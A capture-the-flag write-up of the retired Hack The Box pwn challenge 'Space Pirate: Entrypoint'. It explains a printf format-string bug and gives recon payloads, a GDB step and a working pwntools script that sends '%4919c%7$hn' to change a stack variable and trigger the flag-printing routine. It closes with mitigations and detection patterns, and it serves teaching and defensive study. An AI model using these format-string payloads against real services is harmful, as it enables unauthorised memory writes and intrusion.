---
challenge: "Space Pirate: Entrypoint"
category: Challenge
type: Pwn
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, format-string, printf, local-variable, x86-64, pwntools]
---

# Space Pirate: Entrypoint — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired based on public writeups; not verified with an HTB session.
> No flags or real strings: methodology only.

## TL;DR

Option 1 reads the "serial number" and passes it straight to `printf`, so it is a **format string**. The variable that decides access holds `0xdeadbeef` and is compared with `0xdead1337`: `%7$hn` writes the low two bytes and the door opens. No return address or canary involved.

## Brief and surface

- **Pwn** category, **Very Easy** difficulty, x86-64 ELF and a remote instance.
- The description presents an authentication system with two options: scan a card or enter a password.
- Option 2 compares 15 bytes against a 33-byte password: a dead end on purpose.

```bash
file sp_entrypoint
checksec --file=sp_entrypoint
```

```text
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Every protection is on, but the bug never needs to touch the return address.

## Recon

```text
 1. Scan card 💳
 2. Insert password
 >
```

Choosing `1` asks for the serial and answers `Your card is: <whatever you typed>`. That echo is the hint: the program is using the input as a **format**, not as data.

```text
Insert card's serial number: %lx.%lx.%lx.%lx.%lx.%lx
Your card is: 7ffed66b4cf0.7f61975088c0.0.f.0.deadbeef
```

The sixth value is exactly `deadbeef`: that is the variable we care about.

## Source analysis

`main` has two relevant locals:

```c
local_48 = 0xdeadbeef;
local_40 = &local_48;
...
read(0, local_38, 0x1f);
printf("\nYour card is: ");
printf(local_38);          // format string

if (local_48 == 0xdead1337)
    open_door();           // system("cat flag*")
```

- `local_38` is a 40-byte buffer that receives at most 31 bytes: no overflow.
- `local_48` is `0xdeadbeef` and the check wants `0xdead1337`; only the low two bytes differ.
- `local_40` stores the address of `local_48`, and that address is what shows up at stack position 7.

`open_door()` prints the message and runs `cat flag*`; the goal is to reach it without credentials.

## The bug

`printf` interprets user input. `%lx` reads arguments that were never passed (stack values) and `%n` **writes** the number of printed characters to the given address.

```text
position 6: 0xdeadbeef        (value of local_48)
position 7: address of local_48
```

`%7$hn` writes an `unsigned short` (2 bytes) to the address at position 7. If `0x1337` characters were printed first, the value becomes `0xdead1337`. The rest of the variable is untouched, so the check passes.

`%4919c` prints 4919 characters (0x1337) and `%7$hn` counts them; the address does not have to be written by hand because it is already on the stack.

## Local reproduction

```bash
./sp_entrypoint
# option 1, serial: %6$lx     -> deadbeef
# option 1, serial: %4919c%7$hn
```

To see the address in GDB:

```gdb
gef> grep 0xdeadbeef
# [stack] 0x7fffffffe650
```

Then enumerate the stack again with repeated `%lx.`: position 7 shows `0x7fffffffe650`.

## Exploitation

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = '<IP>', <PORT>
p = remote(HOST, PORT)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'%4919c%7$hn')
print(p.recvall(timeout=5).decode(errors='replace'))
```

- The payload carries no address: `%7$hn` uses the pointer already on the stack.
- `%4919c` must come **before** `%7$hn`; the order sets the value written.
- A different build means locating `local_48` again; 6 and 7 are not universal.
- Alignment and buffer size do not matter: nothing is written out of bounds.

Proof of execution is the `open_door()` message followed by the flag contents.

## Evidence

- `checksec` with Full RELRO, canary, NX and PIE.
- `%6$lx` returning `deadbeef` and `%7$lx` returning the variable's address.
- Local `open_door()` output with a test flag, never the real one.

## Lessons learned

- `printf` with user input is arbitrary write, even when the buffer is correctly sized.
- Memory protections do not cover format bugs: PIE and canary stay on and the attack still works.
- `%n` writes the accumulated count; `%hn` limits it to 2 bytes and avoids printing 32 bits.
- The index (`$`) depends on the build and the stack; confirm it with `%lx` instead of guessing.
- The "impossible" option (a 33-byte password read with 15 bytes) is a decoy: the other path is the way.

## Mitigations and detection

- `printf("%s", buf)` instead of `printf(buf)`; never pass user input as a format.
- Build with `-Wformat -Wformat-security` and `_FORTIFY_SOURCE=2`; review catches the pattern.
- Disable `%n` where possible (glibc restricts it under `FORTIFY_SOURCE` in some cases).
- Detection: requests with `%n`, `%hn`, `%s` or repeated `%lx` chains; processes crashing with SIGSEGV after input containing `%`.
- References: CWE-134 (uncontrolled format string), MITRE T1190.

## References

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-entrypoint/>
- <https://cwe.mitre.org/data/definitions/134.html>
- <https://man7.org/linux/man-pages/man3/printf.3.html>
- <https://docs.pwntools.com/en/stable/tubes.html>
